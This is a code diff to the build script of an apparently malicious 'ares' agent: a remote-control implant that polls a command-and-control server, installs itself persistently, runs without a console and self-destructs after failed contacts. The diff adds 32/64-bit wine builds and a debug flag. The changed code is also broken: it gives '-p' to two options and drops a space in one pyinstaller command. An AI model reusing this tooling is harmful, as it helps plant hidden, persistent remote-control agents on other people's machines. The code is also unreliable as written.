@@ -5,7 +5,8 @@ import shutil
 import tempfile
 
 
-def build_agent(output, server_url, hello_interval, idle_time, max_failed_connections, persist, tls_verify, platform):
+def build_agent(output, server_url, hello_interval, idle_time,
+    max_failed_connections, persist, tls_verify, platform, arch, debug):
     prog_name = os.path.basename(output)
     working_dir = os.path.join(tempfile.gettempdir(), 'ares')
     if os.path.exists(working_dir):
@@ -29,10 +30,23 @@ def build_agent(output, server_url, hello_interval, idle_time, max_failed_connec
     if platform == "linux":
         os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
     elif platform == "windows":
+        cmd_build = ""
         if os.name == "nt":
-            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            if debug:
+                cmd_build = 'pyinstaller --onefile '
+            else:
+                cmd_build = 'pyinstaller --onefile --noconsole'
+            cmd_build += prog_name + '.py'
         else:
-            os.system('wine pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            if arch == "32":
+                cmd_build = 'WINEPREFIX=~/.wine-python32 '
+            else:
+                cmd_build = 'WINEPREFIX=~/.wine-python64 '
+            cmd_build += 'wine pyinstaller --onefile '
+            if not debug:
+                cmd_build += ' --noconsole ' 
+            cmd_build += prog_name + '.py'
+        os.system(cmd_build)
         if not agent_file.endswith(".exe"):
             agent_file += ".exe"
         if not output.endswith(".exe"):
@@ -51,14 +65,20 @@ def main():
     parser.add_argument('--hello-interval', type=int, default=60, help="Delay (in seconds) between each request to the CnC.")
     parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
     parser.add_argument('--max-failed-connections', type=int, default=5000, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
-    parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
+    parser.add_argument('-p', '--persistent', action='store_true', help="Automatically install the agent on first run.")
     parser.add_argument('--no-check-certificate', action='store_true', help="Disable server TLS certificate verification.")
     parser.add_argument('-p', '--platform', required=True, help="Platform (linux or windows)")
+    parser.add_argument('-a', '--arch', default="32", help="32 or 64 (wine only)")
+    parser.add_argument('--debug', action='store_true')
     args = parser.parse_args()
 
     args.platform = args.platform.lower()
     if args.platform not in ['linux', 'windows']:
         print("[!] Invalid plarform, should be windows or linux")
+        exit(1)
+
+    if args.arch not in ['32', '64']:
+        print("[!] Arch should be 32 or 64")
         exit(1)
 
     build_agent(
@@ -69,7 +89,9 @@ def main():
         max_failed_connections=args.max_failed_connections,
         persist=args.persistent,
         tls_verify=(not args.no_check_certificate),
-        platform=args.platform)
+        platform=args.platform,
+        arch=args.arch,
+        debug=args.debug)
 
 
 if __name__ == "__main__":
